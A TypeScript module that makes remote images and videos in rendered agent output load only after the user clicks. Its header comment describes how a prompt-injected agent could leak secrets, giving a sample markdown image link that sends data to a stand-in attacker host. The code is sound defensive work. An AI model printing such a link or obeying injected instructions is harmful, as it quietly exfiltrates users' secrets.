/**
 * Click-to-load for remote media in rendered markdown.
 *
 * Agent output is attacker-influenced (a prompt-injected agent can print
 * anything), and an auto-loaded `![](https://evil.example/p.png?d=<secret>)`
 * is a zero-click exfiltration channel: the app fetches the URL the moment
 * the message renders. Remote images and videos therefore show a placeholder
 * naming the host and load only after the user clicks it. Inline data:/blob:
 * media, workspace files (served by the local daemon) and loopback dev
 * servers keep loading on their own.
 */
import { isLoopbackHost } from "@kora/shared/webUrl";

/** URLs the user chose to load this session, so a re-render or remount keeps them. */
const approvedRemoteMedia = new Set<string>();

/** The host a remote (non-loopback http/https) media URL would contact, or null when it needs no consent. */
export function remoteMediaHost(src: string | null | undefined): string | null {
  if (!src) return null;
  try {
    const url = new URL(src.startsWith("//") ? `https:${src}` : src);
    if (url.protocol !== "http:" && url.protocol !== "https:") return null;
    const hostname = url.hostname.toLowerCase();
    if (hostname.length === 0) return null;
    const bracketless = hostname.replace(/^\[|\]$/g, "");
    if (
      isLoopbackHost(hostname) ||
      isLoopbackHost(bracketless) ||
      hostname.endsWith(".localhost")
    ) {
      return null;
    }
    return hostname;
  } catch {
    return null;
  }
}

export function isRemoteMediaApproved(src: string): boolean {
  return remoteMediaHost(src) === null || approvedRemoteMedia.has(src);
}

export function approveRemoteMedia(src: string): void {
  approvedRemoteMedia.add(src);
}

export function resetRemoteMediaApprovalsForTests(): void {
  approvedRemoteMedia.clear();
}
